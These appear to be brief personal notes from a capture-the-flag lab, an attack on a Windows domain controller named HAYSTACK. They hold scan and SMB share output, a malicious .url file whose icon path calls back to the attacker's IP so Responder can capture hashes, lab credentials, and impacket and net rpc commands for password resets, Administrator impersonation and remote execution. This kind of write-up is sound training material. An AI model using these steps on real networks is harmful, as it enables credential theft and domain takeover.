IP 10.10.68.206

PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack ttl 125
88/tcp   open  kerberos-sec     syn-ack ttl 125
135/tcp  open  msrpc            syn-ack ttl 125
139/tcp  open  netbios-ssn      syn-ack ttl 125
389/tcp  open  ldap             syn-ack ttl 125
445/tcp  open  microsoft-ds     syn-ack ttl 125
464/tcp  open  kpasswd5         syn-ack ttl 125
593/tcp  open  http-rpc-epmap   syn-ack ttl 125
636/tcp  open  ldapssl          syn-ack ttl 125
3268/tcp open  globalcatLDAP    syn-ack ttl 125
3269/tcp open  globalcatLDAPssl syn-ack ttl 125
3389/tcp open  ms-wbt-server    syn-ack ttl 125

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 

Is a domain controller

```bash
netexec smb -u 'kali' -p '' -d THM 10.10.68.206 --shares
```
SMB         10.10.68.206    445    HAYSTACK         Share           Permissions     Remark
SMB         10.10.68.206    445    HAYSTACK         -----           -----------     ------
SMB         10.10.68.206    445    HAYSTACK         ADMIN$                          Remote Admin
SMB         10.10.68.206    445    HAYSTACK         C$                              Default share
SMB         10.10.68.206    445    HAYSTACK         Data            READ,WRITE      
SMB         10.10.68.206    445    HAYSTACK         IPC$            READ            Remote IPC
SMB         10.10.68.206    445    HAYSTACK         NETLOGON                        Logon server share 
SMB         10.10.68.206    445    HAYSTACK         SYSVOL                          Logon server share 


SMB > Data > onboarding

  53s24knv.krd.pdf                    A  4700896  Mon Jul 17 04:11:53 2023
  aikehcql.civ.pdf                    A  3032659  Mon Jul 17 04:12:09 2023
  dtlwvmh4.0gm.txt                    A      521  Mon Aug 21 14:21:59 2023

PDF consistent, but txt and other files changed around

NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file, files were deleted and others in their place

Domain Name: THM
Name: HAYSTACK

domain:thm.corp

Responder

```
└─$ cat shell.url       
[InternetShortcut]
URL=bananas
WorkingDirectory=bananas
IconFile=\\10.13.77.49\\%USERNAME%.icon
IconIndex=1


responder -I tun0
```

```
└─$ bloodhound-python -c All -u 'TABATHA_BRITT' -p 'marlboro(1985)' -d thm.corp -ns 10.10.68.206 --zip

└─$ net rpc password 'CRUZ_HALL' 'P@55w0rd!' -U "thm.corp"/"SHAWNA_BRAY"%'P@55w0rd!' -S 10.10.68.206

(Continued up chain of accounts compromised. First set of creds in command is what ur setting, second is what ur authing with)

└─$ impacket-getST -k -impersonate Administrator -spn cifs/HayStack.thm.corp thm.corp/DARLA_WINTERS


└─$ export KRB5CCNAME=Administrator.ccache

└─$ impacket-wmiexec -k -no-pass Administrator@Haystack.thm.corp 


```